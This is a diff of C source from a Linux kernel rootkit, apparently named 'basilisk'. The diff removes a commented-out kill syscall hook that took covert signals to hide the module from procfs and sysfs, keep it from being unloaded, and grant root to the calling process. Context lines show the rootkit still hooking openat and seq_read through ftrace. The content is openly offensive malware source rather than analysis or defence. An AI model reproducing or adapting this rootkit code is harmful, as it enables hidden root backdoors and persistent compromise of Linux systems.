@@ -312,86 +312,8 @@ static asmlinkage long hook_openat(int dfd, const char __user *filename, int fla
 }
 #endif
 
-/*
-Kill syscall hook.
-Intercepts signals to communicate with the adversary.
-
-SIG_HIDE calls handle_lkm_hide (hide/show from sysfs/procfs)
-SIG_PROTECT calls handle_lkm_protect (increase/decrease the module ref count)
-SIG_GODMODE calls handle_lkm_hide AND handle_lkm_protect
-SIG_ROOT calls set_root (give root to the caller process)
-
-Otherwise it calls the original kill syscall.
-*/
-
-// #ifdef PTREGS_SYSCALL_STUBS
-// static asmlinkage long (*orig_kill)(const struct pt_regs *);
-
-// asmlinkage int hook_kill(const struct pt_regs *regs)
-// { 
-//  /* declare required prototypes (defined below, for clarity) */
-//     int sig = regs->si;
-
-//     switch (sig) {
-//         case SIG_HIDE:
-//             handle_lkm_hide();
-//             break;
-
-//         case SIG_PROTECT:
-//             handle_lkm_protect(&protected);
-//             break;
-        
-//         case SIG_GODMODE:
-//             handle_lkm_hide();
-//             handle_lkm_protect(&protected);
-//             break;
-
-//         case SIG_ROOT:
-//             pr_info("basilisk: giving root...\n");
-//             set_root();
-//             break;
-
-//         default:
-//             return orig_kill(regs);
-//     }
-//     return 0;
-// }
-
-// #else
-// /* This is the old way of declaring a syscall hook */
-// static asmlinkage long (*orig_kill)(pid_t pid, int sig);
-
-// asmlinkage int hook_kill(pid_t pid, int sig)
-// {
-//     switch (sig) {
-//         case SIG_HIDE:
-//             handle_lkm_hide(&hidden);
-//             break;
-
-//         case SIG_PROTECT:
-//             handle_lkm_protect(&protected);
-//             break;
-        
-//         case SIG_GODMODE:
-//             handle_lkm_hide(&hidden);
-//             handle_lkm_protect(&protected);
-//             break;
-
-//         case SIG_ROOT:
-//             pr_info("basilisk: giving root...\n");
-//             set_root();
-//             break;
-
-//         default:
-//             return orig_kill(pid, sig);
-//     }
-//     return 0;
-// }
-// #endif
-
 /* Declare the struct that ftrace needs to hook the syscall */
 static struct ftrace_hook hooks[] = {
-    // HOOK("sys_kill", hook_kill, &orig_kill),
     HOOK("sys_openat", hook_openat, &orig_openat),
     HOOK("seq_read", hook_seq_read, &orig_seq_read),
 };
